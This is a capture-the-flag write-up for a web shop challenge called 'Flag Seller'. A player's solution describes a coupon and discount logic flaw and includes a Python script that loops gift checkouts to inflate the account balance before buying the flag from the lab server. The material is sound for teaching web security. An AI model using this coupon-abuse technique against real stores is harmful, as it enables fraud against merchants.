# Flag Seller

## 1. Description

Welcome to VHC's Shopping Mail! Our digital market is aimed to beat all Lozodo, Seehop and all the marketplace out there! Can you imagine how a "passwordless", and even "usernameless" marketplace could be such a greatttt invention??

For this one and only 9/12 sale, we will discount allll the things for you to buy!

Enjoyyy!!!!

### Guide: 
1. Turn on your Docker instance. 
2. Access: `http://14.225.211.39:$PORT` where `$PORT` is the port number given by the system.
3. pwn!

### Notes
+ The `revert` button only refresh the Docker instance for you, not to be used for deleting the containers.
+ Because of performance-critical reasons, we will shut down all of the containers periodically (2-4 hours). We will put announcement when we nuke all of the containers :)

Author: `@Thanh-Wutan`

## 2. Build

```bash
docker build -t flag_seller . 
```

This is a `docker-dynamic` challenge, aka it's required a request to create a container from image.

## 3. Solution

> Author: @teebow1e from hust3r

When I first approach this challenge, the name "Flag Seller" suggests Race Condition or logic vulnerability when handling user input. However, given the fact that the server is really laggy (I assume people are flooding the server w/ requests to exploit Race Condition) and the admins are not ready for back-up plan, I think the vulnerability is not Race Condition. Input fuzzing also shows that the website has no vulnerability when dealing with numbers that are too big/small or real numbers. At this point I decided to full audit the web application.

Here are my results:
1. Endpoint `/`
- The `Redeem coupon` appears to not work with anything.
- Every feedback sent will always returns "THANKYOU" as a discount code.
2. Endpoint `/add_to_cart`
- Will simply add item to cart
- The numbers of item added can be manipulated by editing the respective cookie.
3. Endpoint `/checkout?`
- Will checkout the item in cart, simply reduce the money you have.
- However, if you checkout the item `gifts`, you will receive back a coupon - which will give you back 100$ when redeemed and I can also get coupon for **discounted** item.

At this point, I got my exploitation plan:
- Add 10 gifts to my cart so that when I checkout, I will get back 10 coupons = $1000
- Add `THANKYOU` as discount code, so that I only have to pay $900


--> 100$ for free.

My exploitation script:
```python
import requests
import re

url = "http://14.225.211.39:50854/"
cookies = {}

s = requests.session()
initial_request = s.get(url)
cookies['session'] = initial_request.cookies['session']

def lo_hong_kinh_te():
    discount_req = s.post(url + "/cart", data={"discount_code": "THANKYOU"}, cookies=cookies)
    if "applied" in discount_req.text:
        print("[+] Discount applied.")
    else:
        print("[!] probably something wrong")

    print("[-] Adding 10 gifts to cart..")
    for _ in range(10):
        s.post(url + "/add_to_cart/gift")

    checkout = s.get(url + "/checkout?", cookies=cookies)
    checkout_message = checkout.text

    coupon_text = [item for item in checkout_message.split(": ")][1]
    coupons = [coupon for coupon in coupon_text.split(", ")]
    print(f"[+] Received {len(coupons)} coupons!")
    for coupon in coupons:
        redeem_cp = s.post(url + "/submit_coupon", data={"coupon":coupon}, cookies=cookies)
        print(redeem_cp.text)

if __name__ == "__main__":
    for _ in range(5):
        print(f"[-] Attempt {_} to exploit lỗ hổng kinh tế.")
        lo_hong_kinh_te()
        print("[+] Exploit complete.")
        print()

    final_cart = s.get(url + "/cart").text
    user_balance = re.search(r'<p>User\'s Balance: (\$[\d,]+)</p>', final_cart).group(1) if re.search(r'<p>User\'s Balance: (\$[\d,]+)</p>', final_cart) else None
    print(f"[+] Number of money you have after exploitation: {user_balance}")
    s.post(url + "/cart", data={"discount_code": "THANKYOU"}, cookies=cookies)
    s.post(url + "/add_to_cart/flag")
    buy_flag = s.get(url + "/checkout?").text
    print(f"[!] {buy_flag}")
```